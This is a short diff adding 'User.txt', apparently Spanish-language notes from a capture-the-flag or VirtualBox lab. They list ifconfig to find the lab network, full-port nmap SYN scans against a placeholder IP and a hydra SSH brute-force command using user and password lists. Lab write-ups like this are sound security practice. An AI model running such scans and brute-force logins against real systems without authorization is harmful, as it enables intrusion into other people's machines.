@@ -1,0 +1,6 @@
+User.txt
+
+ifconfig y vemos cual es la red del entorno, interfaz vboxnet0
+nmap -p- -sS --min-rate 5000 --open -vvv IP 
+nmap -p- --min-rate 5000 --open -vvv IP -oN ports  
+hydra -L users.txt -P pass.txt ssh://IP
